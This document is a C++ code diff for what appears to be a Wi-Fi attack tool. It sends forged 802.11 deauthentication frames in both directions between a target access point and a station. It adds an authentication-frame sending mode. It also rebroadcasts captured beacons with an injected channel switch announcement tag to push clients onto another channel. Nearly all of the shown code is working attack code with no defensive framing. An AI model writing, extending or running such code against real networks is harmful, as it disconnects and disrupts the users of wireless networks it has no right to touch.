@@ -10,6 +10,7 @@ Runner::Runner()
     pcapRX = nullptr;
     pcapTX = nullptr;
 }
+
 Runner::~Runner()
 {
     stop();
@@ -25,10 +26,14 @@ void Runner::TXloop()
             cmd = currentCmd;
         }
 
+        uint8_t dummy[12] = {0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
+
         if(cmd.action == Act::DEAUTH)
         {
             // 1. AP -> STATION
             ST_DEAUTH_PACKET pktAtoS;
+            memset(&pktAtoS, 0, sizeof(ST_DEAUTH_PACKET));
+            memcpy(pktAtoS.rdt_hdr, dummy, sizeof(dummy));
             pktAtoS.wl = getApDeauth(currentCmd.target_ap, currentCmd.target_st);
             int res0 = pcap_sendpacket(pcapTX, (const u_char*)&pktAtoS, sizeof(pktAtoS));
             if (res0 != 0)
@@ -39,6 +44,8 @@ void Runner::TXloop()
 
             // 2. STATION -> AP
             ST_DEAUTH_PACKET pktStoA;
+            memset(&pktStoA, 0, sizeof(ST_DEAUTH_PACKET));
+            memcpy(pktStoA.rdt_hdr, dummy, sizeof(dummy));
             pktStoA.wl = getStDeauth(currentCmd.target_ap, currentCmd.target_st);
             int res1 = pcap_sendpacket(pcapTX, (const u_char*)&pktStoA, sizeof(pktStoA));
             if (res1 != 0)
@@ -47,7 +54,37 @@ void Runner::TXloop()
                 fflush(stderr);
             }
 
-            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            std::this_thread::sleep_for(std::chrono::milliseconds(300));
+        }
+        else if(cmd.action == Act::AUTH)
+        {
+            ST_AUTH_PACKET authPacket;
+            memset(&authPacket, 0, sizeof(ST_AUTH_PACKET));
+            memcpy(authPacket.rdt_hdr, dummy, sizeof(dummy));
+            authPacket.wl = getAuth_H(cmd.target_ap, cmd.target_st);
+            authPacket.auth = getAuth_B();
+
+            int res0 = pcap_sendpacket(pcapTX, (const u_char*)&authPacket, sizeof(authPacket));
+            if(res0 != 0)
+            {
+                fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
+                fflush(stderr);
+            }
+/*
+            std::this_thread::sleep_for(std::chrono::milliseconds(20));
+
+            ST_ACK_PACKET ackPacket;
+            memset(&ackPacket, 0, sizeof(ST_ACK_PACKET));
+            memcpy(ackPacket.rdt_hdr, dummy, sizeof(dummy));
+            ackPacket.ack = getAck(cmd.target_ap);
+            int res1 = pcap_sendpacket(pcapTX, (const u_char*)&ackPacket, sizeof(ackPacket));
+            if(res1 != 0)
+            {
+                fprintf(stderr, "[DAEMON TX] sendpacket failed: %s\n", pcap_geterr(pcapTX));
+                fflush(stderr);
+            }
+*/
+            std::this_thread::sleep_for(std::chrono::milliseconds(300));
         }
         else
         {
@@ -137,78 +174,106 @@ void Runner::RXloop(const std::string& dev)
             const ST_RDT* rdt = reinterpret_cast<const ST_RDT*>(packet);
             const ST_WL* wl = reinterpret_cast<const ST_WL*>(packet+rdt->len);
 
-            uint64_t wirelessLen = sizeof(ST_WL);
-            int16_t tagLen = 0;
-            // 비콘 체크
-            if (!chkBeacon(*wl)) continue;
-            if (currentCmd.action == Act::CSA && memcmp(wl->bssid.mac, currentCmd.target_ap.mac, 6) == 0)
+            WLTYPE type = chkWlType(wl);
+
+            if(type == WLTYPE::AP)
             {
-                // CSA Start
-                int packetCount = presentCount(packet);
-                uint32_t capLen = header->caplen;
-                bool isFcs = hasFcs(packet, rdt, packetCount);
-                uint8_t fixedRdtLen = 12;
+                uint64_t wirelessLen = sizeof(ST_WL);
+                int16_t tagLen = 0;
 
-                const u_char* beaconTagPacket = (packet+rdt->len+wirelessLen+sizeof(ST_BC_COMMON));
-                tagLen = capLen-rdt->len-wirelessLen-sizeof(ST_BC_COMMON);
-                uint16_t newPacketLen = capLen + 5;
-
-                if (isFcs) { tagLen -= 4; newPacketLen -=4; }
-
-                uint16_t insertTagLoc = capLen - (isFcs?4:0) - tagLen + getInsertTagLoc(beaconTagPacket, tagLen, 37);
-                uint16_t remainLen = capLen - insertTagLoc - (isFcs?4:0);
-
-                uint8_t newPacket[4096];
-                bool stationMode = false;
-                for(int i=0; i<6; i++) { if(currentCmd.target_st.mac[i] != 0xFF) stationMode = true; }
-                if(stationMode)
+                if (!chkBeacon(*wl)) continue;
+                if (currentCmd.action == Act::CSA && memcmp(wl->bssid.mac, currentCmd.target_ap.mac, 6) == 0)
                 {
-                    memcpy(newPacket, packet, rdt->len + 4);
-                    memcpy(newPacket + fixedRdtLen + 4, currentCmd.target_st.mac, 6);
-                    memcpy(newPacket + fixedRdtLen + 10, packet + rdt->len + 10, insertTagLoc - rdt->len - 10);
+                    // CSA Start
+                    // action frame도 있음
+                    int packetCount = presentCount(packet);
+                    uint32_t capLen = header->caplen;
+                    bool isFcs = hasFcs(packet, rdt, packetCount);
+
+                    const u_char* beaconTagPacket = (packet+rdt->len+wirelessLen+sizeof(ST_BC_COMMON));
+                    tagLen = capLen-rdt->len-wirelessLen-sizeof(ST_BC_COMMON);
+                    uint16_t newPacketLen = capLen + 5;
+
+                    if (isFcs) { tagLen -= 4; newPacketLen -=4; }
+
+                    uint16_t insertTagLoc = capLen - (isFcs?4:0) - tagLen + getInsertTagLoc(beaconTagPacket, tagLen, 37);
+                    uint16_t remainLen = capLen - insertTagLoc - (isFcs?4:0);
+
+                    uint8_t newPacket[4096];
+                    bool stationMode = false;
+                    for(int i=0; i<6; i++) { if(currentCmd.target_st.mac[i] != 0xFF) stationMode = true; }
+                    if(stationMode)
+                    {
+                        memcpy(newPacket, packet, rdt->len + 4);
+                        memcpy(newPacket + rdt->len + 4, currentCmd.target_st.mac, 6);
+                        memcpy(newPacket + rdt->len, packet + rdt->len + 10, insertTagLoc - rdt->len - 10);
+                    }
+                    else
+                    {
+                        memcpy(newPacket, packet, insertTagLoc);
+                    }
+
+                    uint8_t csaTag[5] = {0x25, 0x03, 0x01, (uint8_t)currentCmd.channel, 0x03};
+                    memcpy(newPacket + insertTagLoc, csaTag, 5);
+                    memcpy(newPacket + insertTagLoc + 5, packet + insertTagLoc, remainLen);
+
+                    pcap_sendpacket(pcapTX, newPacket, newPacketLen);
+                    // CSA End
                 }
-                else
+
+                ST_IPC_EVENT event;
+                memset(&event, 0, sizeof(event));
+                event.type = 0;
+                event.bssid = wl->bssid;
+
+                const u_char* tagStart = (packet + rdt->len + 24 + 12);
+                tagLen = header->caplen - rdt->len - 36;
+                // getEssid -> TAG 0이 없으면 false, 있으면 true
+                if(!getEssid(event.essid, sizeof(event.essid), tagStart, tagLen)) continue;
+
+                ST_RDT_DATA rdtData = getRdtInfo(packet, rdt, presentCount(packet));
+                if(rdtData.pwr != 999) event.pwr = static_cast<int16_t>(rdtData.pwr);
+                int ch = getCh(tagStart, tagLen);
+                if(0 < ch)
                 {
-                    memcpy(newPacket, packet, insertTagLoc);
+                    event.ch = static_cast<int16_t>(ch);
+                }
+                else // ch정보가 비콘 바디에 없는 경우. 라디오탭거 사용.
+                {
+                    if(rdtData.ch != 0)
+                    {
+                        event.ch = static_cast<int16_t>(rdtData.ch);
+
+                    }
+                    else event.ch = 0;
                 }
 
-                uint8_t csaTag[5] = {0x25, 0x03, 0x01, (uint8_t)currentCmd.channel, 0x03};
-                memcpy(newPacket + insertTagLoc, csaTag, 5);
-                memcpy(newPacket + insertTagLoc + 5, packet + insertTagLoc, remainLen);
-
-                pcap_sendpacket(pcapTX, newPacket, newPacketLen);
-                // CSA End
+                std::lock_guard<std::mutex> outLock(outMutex);
+                fwrite(&event, sizeof(ST_IPC_EVENT), 1, stdout);
+                fflush(stdout);
             }
-            ST_IPC_EVENT event;
-            memset(&event, 0, sizeof(event));
-            event.type = 0;
-            event.bssid = wl->bssid;
-
-            const u_char* tagStart = (packet + rdt->len + 24 + 12);
-            tagLen = header->caplen - rdt->len - 36;
-            // getEssid -> TAG 0이 없으면 false, 있으면 true
-            if(!getEssid(event.essid, sizeof(event.essid), tagStart, tagLen)) continue;
-
-            ST_RDT_DATA rdtData = getRdtInfo(packet, rdt, presentCount(packet));
-            if(rdtData.pwr != 999) event.pwr = static_cast<int16_t>(rdtData.pwr);
-            int ch = getCh(tagStart, tagLen);
-            if(0 < ch)
+            else if(type == WLTYPE::STATION)
             {
-                event.ch = static_cast<int16_t>(ch);
-            }
-            else // ch정보가 비콘 바디에 없는 경우. 라디오탭거 사용.
-            {
-                if(rdtData.ch != 0)
+                ST_STATION_INFO stInfo;
+                if(getStationInfo(rdt, wl, stInfo))
                 {
-                    event.ch = static_cast<int16_t>(rdtData.ch);
+                    ST_IPC_EVENT event;
+                    memset(&event, 0, sizeof(ST_IPC_EVENT));
 
+                    event.type = 1;
+                    event.bssid = stInfo.bssid;
+                    event.st_mac = stInfo.st_mac;
+                    ST_RDT_DATA rdtData = getRdtInfo(packet, rdt, presentCount(packet));
+                    if(rdtData.pwr != 999) event.pwr = static_cast<int16_t>(rdtData.pwr);
+
+                    std::lock_guard<std::mutex> outLock(outMutex);
+                    fwrite(&event, sizeof(ST_IPC_EVENT), 1, stdout);
+                    fflush(stdout);
                 }
-                else event.ch = 0;
             }
 
-            std::lock_guard<std::mutex> outLock(outMutex);
-            fwrite(&event, sizeof(ST_IPC_EVENT), 1, stdout);
-            fflush(stdout);
+
+
         }
     }
 
